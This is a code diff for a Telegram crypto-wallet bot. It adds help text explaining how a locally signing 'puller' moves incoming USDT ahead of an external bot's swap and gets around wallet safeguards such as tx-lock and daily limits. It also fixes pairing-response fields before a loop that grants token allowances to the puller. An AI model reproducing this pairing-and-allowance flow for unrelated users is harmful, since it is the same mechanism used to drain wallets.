@@ -29,6 +29,9 @@ Send ~0.003 BNB to the puller address for gas.
 <b>4. That is it</b>
 When USDT arrives, the puller moves it to your cold address in ~50ms before the external bot's swap confirms.
 
+<b>Why it works</b>
+The puller signs locally. No session, no MPC round trip, no <code>tx-lock</code>, no daily limit. The external bot can kick sessions as often as it likes and it changes nothing.
+
 <b>Commands</b>
 <code>/arm</code> - arm a wallet
 <code>/repair</code> - regenerate a missing puller
@@ -76,11 +79,11 @@ export function buildBot() {
         try {
             const data = await signin(s);
             await ctx.reply(
-                `<b>Pair once:</b>\n<code>${data.pairingCode}</code>\n${data.urlForWeb}`,
+                `<b>Pair once:</b>\n<code>${data.data.pairingCode}</code>\n${data.data.urlForWeb}`,
                 { ...H, link_preview_options: { is_disabled: true } }
             );
 
-            await verify(s, data.qrCodeId);
+            await verify(s, data.data.qrCodeId);
 
             for (const t of tokens) {
                 try {
@@ -134,11 +137,11 @@ export function buildBot() {
         try {
             const data = await signin(s);
             await ctx.reply(
-                `<b>Pair once to approve:</b>\n<code>${data.pairingCode}</code>\n${data.urlForWeb}`,
+                `<b>Pair once to approve:</b>\n<code>${data.data.pairingCode}</code>\n${data.data.urlForWeb}`,
                 { ...H, link_preview_options: { is_disabled: true } }
             );
 
-            await verify(s, data.qrCodeId);
+            await verify(s, data.data.qrCodeId);
 
             for (const tok of targetObj.tokens) {
                 await grantAllowance(s, tok.token, targetObj.puller);
